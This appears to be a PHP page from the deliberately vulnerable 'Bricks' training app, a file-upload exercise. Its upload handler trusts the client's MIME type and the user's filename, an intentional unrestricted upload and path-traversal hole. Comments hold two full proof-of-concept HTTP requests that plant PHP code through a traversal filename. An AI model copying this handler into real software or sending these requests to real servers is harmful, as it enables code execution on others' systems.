<!DOCTYPE html>
<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width" />
  <title>Bricks File Upload #3</title>  
  <!-- Included CSS Files (Uncompressed) -->
  <!--
  <link rel="stylesheet" href="../stylesheets/foundation.css">
  -->  
  <!-- Included CSS Files (Compressed) -->
  <link rel="stylesheet" href="../stylesheets/foundation.min.css">
  <link rel="stylesheet" href="../stylesheets/app.css">
  <script src="../javascripts/modernizr.foundation.js"></script>
  <!-- IE Fix for HTML5 Tags -->
  <!--[if lt IE 9]>
    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <![endif]-->
</head>
<body>
<div class="row">
	<div class="four columns centered">
		<br/><br/><a href="../index.php"><img src="../images/bricks.jpg" /></a><br/>
		<p>
			<?php
				$valid_file_extensions = array(".jpg", ".jpeg", ".png");
				if(isset($_POST['upload'])) {
					$filename =  $_FILES['userfile']['name'];
					$img_type = $_FILES['userfile']['type'];
					$destination = 'uploads/' . $_FILES['userfile']['name'];
					if (($img_type == 'image/png') || ($img_type == 'image/jpeg')  ) {
						// TODO: AI issue #9, High, Unrestricted File Upload, https://github.com/rbm1718/bricks/issues/9
						//
						// POST /upload-3/index.php HTTP/1.1
						// Host: localhost
						// Accept-Encoding: identity
						// Connection: close
						// Content-Length: 307
						// Content-Type: multipart/form-data; boundary=e77d02b5db6c4bf2ba6877e0b8c80f87
						//
						// --e77d02b5db6c4bf2ba6877e0b8c80f87
						// Content-Disposition: form-data; name="upload"
						//
						// 935137890000
						// --e77d02b5db6c4bf2ba6877e0b8c80f87
						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
						// Content-Type: image/png
						//
						// <?php phpinfo(); ?>
						// --e77d02b5db6c4bf2ba6877e0b8c80f87--
						//
						// TODO: AI issue #9, High, Unrestricted File Upload, https://github.com/rbm1718/bricks/issues/9
						//
						// POST /upload-3/index.php HTTP/1.1
						// Host: localhost
						// Accept-Encoding: identity
						// Connection: close
						// Content-Length: 308
						// Content-Type: multipart/form-data; boundary=06e135bc0bec479c911ec32f2f8e0691
						//
						// --06e135bc0bec479c911ec32f2f8e0691
						// Content-Disposition: form-data; name="upload"
						//
						// 935137890000
						// --06e135bc0bec479c911ec32f2f8e0691
						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
						// Content-Type: image/jpeg
						//
						// <?php phpinfo(); ?>
						// --06e135bc0bec479c911ec32f2f8e0691--
						//
						if (move_uploaded_file($_FILES['userfile']['tmp_name'],$destination)) {
							echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
						}
					} else {
						echo "<div class=\"alert-box alert\">Upload failed.<a href=\"\" class=\"close\">&times;</a></div>";
							}
							}
			?>
			<form enctype="multipart/form-data" action="index.php" method="POST">
				<fieldset>
					<legend>Upload</legend>
					<input name="userfile" class="small button" type="file" /><br/><br/>
					<input type="submit" class="small button" name="upload" id="upload" value="Upload" /><br/><br/>
				</fieldset>
			</form>
		</p><br/>
	</div>
</div>
  
  <!-- Included JS Files (Uncompressed) -->
  <!--  
  <script src="../javascripts/jquery.js"></script>  
  <script src="../javascripts/jquery.foundation.mediaQueryToggle.js"></script>  
  <script src="../javascripts/jquery.foundation.forms.js"></script>  
  <script src="../javascripts/jquery.foundation.reveal.js"></script>  
  <script src="../javascripts/jquery.foundation.orbit.js"></script>  
  <script src="../javascripts/jquery.foundation.navigation.js"></script>  
  <script src="../javascripts/jquery.foundation.buttons.js"></script>  
  <script src="../javascripts/jquery.foundation.tabs.js"></script>  
  <script src="../javascripts/jquery.foundation.tooltips.js"></script>  
  <script src="../javascripts/jquery.foundation.accordion.js"></script>  
  <script src="../javascripts/jquery.placeholder.js"></script>  
  <script src="../javascripts/jquery.foundation.alerts.js"></script>  
  <script src="../javascripts/jquery.foundation.topbar.js"></script>  
  <script src="../javascripts/jquery.foundation.joyride.js"></script>  
  <script src="../javascripts/jquery.foundation.clearing.js"></script>  
  <script src="../javascripts/jquery.foundation.magellan.js"></script>  
  -->  
  <!-- Included JS Files (Compressed) -->
  <script src="../javascripts/jquery.js"></script>
  <script src="../javascripts/foundation.min.js"></script>  
  <!-- Initialize JS Plugins -->
  <script src="../javascripts/app.js"></script>
</body>
</html>